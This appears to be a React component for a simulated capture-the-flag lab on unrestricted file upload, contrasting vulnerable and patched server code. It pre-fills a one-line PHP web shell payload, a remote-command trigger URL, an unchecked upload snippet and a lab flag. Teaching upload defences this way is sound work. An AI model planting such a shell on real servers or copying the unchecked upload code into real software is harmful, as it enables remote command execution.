import React, { useState } from 'react';
import { Upload, ShieldAlert, ShieldCheck, Play, Award, FileText, CheckCircle2, AlertTriangle } from 'lucide-react';
import confetti from 'canvas-confetti';

export default function FileUploadLab({ isPatched, unlockFlag }) {
  const [fileName, setFileName] = useState('cmd_shell.php');
  const [fileContent, setFileContent] = useState('<?php system($_GET["cmd"]); ?>');
  const [uploadStatus, setUploadStatus] = useState(null);

  const injectShell = () => {
    setFileName('cmd_shell.php');
    setFileContent('<?php system($_GET["cmd"]); ?>');
  };

  const handleUpload = (e) => {
    e.preventDefault();

    const isPhp = fileName.toLowerCase().endsWith('.php') || 
                  fileName.toLowerCase().includes('.php.');

    if (!isPatched) {
      if (isPhp) {
        unlockFlag('upload', 'CTF{unrestricted_file_upload_flag}');
        confetti({ particleCount: 50, spread: 60 });

        setUploadStatus({
          success: true,
          status: '201 Created (WEBSHELL UPLOADED TO /uploads/)',
          path: `/var/www/html/uploads/${fileName}`,
          execUrl: `http://targetlab.internal/uploads/${fileName}?cmd=id`,
          flag: 'CTF{unrestricted_file_upload_flag}'
        });
      } else {
        setUploadStatus({
          success: true,
          status: '201 Created (Clean File Uploaded)',
          path: `/uploads/${fileName}`
        });
      }
    } else {
      // Patched Mode - Strict Extension Validation
      if (isPhp) {
        setUploadStatus({
          success: false,
          status: '400 Bad Request (File Extension Rejected)',
          msg: 'SECURITY BLOCK: Only safe extensions (.jpg, .png) are permitted. Executable scripts disallowed.'
        });
      } else {
        setUploadStatus({
          success: true,
          status: '201 Created (File Sanitized & Saved safely)',
          path: `/uploads/sanitized_${Date.now()}_img.png`
        });
      }
    }
  };

  return (
    <div className="animate-fadeIn" style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 24px 40px 24px' }}>
      
      {/* Header */}
      <div className="cyber-card" style={{ padding: '24px 32px', marginBottom: '24px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div>
          <div style={{ fontSize: '11px', color: 'var(--cyber-green)', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '1px' }}>
            OWASP A04:2021 • INSECURE DESIGN & FILE UPLOAD
          </div>
          <h1 style={{ fontSize: '26px', fontWeight: 800, color: '#fff', marginTop: '4px', display: 'flex', alignItems: 'center', gap: '10px' }}>
            <Upload size={28} color="var(--cyber-cyan)" /> Malicious File Upload Lab
          </h1>
          <p style={{ color: 'var(--text-muted)', fontSize: '13px', marginTop: '4px' }}>
            Test unrestricted file extension bypasses (`shell.php`) and webshell deployment.
          </p>
        </div>

        <div className="cyber-card" style={{ padding: '10px 16px', background: 'rgba(5, 8, 15, 0.7)' }}>
          <div style={{ fontSize: '10px', color: 'var(--text-dim)', fontWeight: 600 }}>CHALLENGE GOAL</div>
          <div className="font-mono" style={{ fontSize: '12px', color: 'var(--cyber-cyan)', fontWeight: 700 }}>
            Upload executable PHP webshell to web root
          </div>
        </div>
      </div>

      {/* Main Grid */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>
        
        {/* Left: Upload Form */}
        <div className="cyber-card" style={{ padding: '28px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
            <h3 style={{ fontSize: '18px', fontWeight: 700, color: '#fff', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <FileText size={20} color="var(--cyber-cyan)" /> Avatar / File Upload Portal
            </h3>

            <button
              onClick={injectShell}
              className="cyber-btn"
              style={{ padding: '4px 10px', fontSize: '11px' }}
            >
              Inject WebShell Payload
            </button>
          </div>

          <form onSubmit={handleUpload} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
            <div>
              <label style={{ display: 'block', fontSize: '12px', fontWeight: 600, color: 'var(--text-muted)', marginBottom: '6px' }}>
                File Name (with Extension):
              </label>
              <input
                type="text"
                className="cyber-input"
                value={fileName}
                onChange={(e) => setFileName(e.target.value)}
              />
            </div>

            <div>
              <label style={{ display: 'block', fontSize: '12px', fontWeight: 600, color: 'var(--text-muted)', marginBottom: '6px' }}>
                File Payload Content:
              </label>
              <textarea
                rows="4"
                className="cyber-input"
                value={fileContent}
                onChange={(e) => setFileContent(e.target.value)}
              />
            </div>

            <button
              type="submit"
              className={`cyber-btn ${isPatched ? 'cyber-btn-cyan' : 'cyber-btn-red'}`}
              style={{ padding: '12px', fontSize: '14px' }}
            >
              <Upload size={16} /> Upload File to Web Server
            </button>
          </form>

          {/* Defense Patch Indicator */}
          <div style={{
            marginTop: '24px',
            padding: '12px 16px',
            borderRadius: '8px',
            background: isPatched ? 'rgba(16, 185, 129, 0.08)' : 'rgba(239, 68, 68, 0.08)',
            border: isPatched ? '1px solid rgba(16, 185, 129, 0.3)' : '1px solid rgba(239, 68, 68, 0.3)',
            fontSize: '12px',
            color: isPatched ? 'var(--cyber-green)' : 'var(--cyber-red)'
          }}>
            {isPatched ? (
              <div>
                <strong>SECURED CODE (Extension Whitelist & Non-executable Dir):</strong>
                <pre className="font-mono" style={{ fontSize: '11px', marginTop: '6px', color: '#fff' }}>
                  const ext = path.extname(file).toLowerCase();
                  if (!['.jpg', '.png'].includes(ext)) throw new Error("Blocked");
                </pre>
              </div>
            ) : (
              <div>
                <strong>VULNERABLE CODE (No Extension Verification):</strong>
                <pre className="font-mono" style={{ fontSize: '11px', marginTop: '6px', color: '#f87171' }}>
                  fs.move(file.path, '/var/www/html/uploads/' + file.name);
                </pre>
              </div>
            )}
          </div>
        </div>

        {/* Right: Upload Result */}
        <div className="cyber-card" style={{ padding: '28px' }}>
          <h3 style={{ fontSize: '18px', fontWeight: 700, color: '#fff', marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <Upload size={20} color="var(--cyber-green)" /> Server File Storage Output
          </h3>

          {uploadStatus ? (
            <div className="animate-fadeIn">
              <div style={{
                padding: '14px',
                borderRadius: '8px',
                background: uploadStatus.success ? 'rgba(16, 185, 129, 0.15)' : 'rgba(239, 68, 68, 0.15)',
                border: uploadStatus.success ? '1px solid var(--cyber-green)' : '1px solid var(--cyber-red)',
                marginBottom: '16px'
              }}>
                <div style={{ fontSize: '14px', fontWeight: 800, color: uploadStatus.success ? 'var(--cyber-green)' : 'var(--cyber-red)', marginBottom: '4px' }}>
                  {uploadStatus.status}
                </div>
                {uploadStatus.path && (
                  <div className="font-mono" style={{ fontSize: '12px', color: '#fff', marginTop: '6px' }}>
                    Path: {uploadStatus.path}
                  </div>
                )}
                {uploadStatus.execUrl && (
                  <div className="font-mono" style={{ fontSize: '12px', color: 'var(--cyber-amber)', marginTop: '4px' }}>
                    RCE Execution Trigger: {uploadStatus.execUrl}
                  </div>
                )}
                {uploadStatus.msg && (
                  <div style={{ fontSize: '12px', color: 'var(--cyber-red)', marginTop: '4px' }}>
                    {uploadStatus.msg}
                  </div>
                )}
              </div>

              {uploadStatus.flag && (
                <div style={{ background: '#08120b', border: '1px solid var(--cyber-green)', padding: '12px', borderRadius: '8px', textAlign: 'center' }}>
                  <div style={{ fontSize: '11px', color: 'var(--cyber-green)', fontWeight: 700 }}>🏆 FLAG UNLOCKED</div>
                  <div className="font-mono" style={{ fontSize: '14px', color: '#00ff66', fontWeight: 800, marginTop: '4px' }}>
                    {uploadStatus.flag}
                  </div>
                </div>
              )}
            </div>
          ) : (
            <div style={{ color: 'var(--text-dim)', fontSize: '13px' }}>
              Upload a file to test server directory storage response...
            </div>
          )}
        </div>

      </div>
    </div>
  );
}
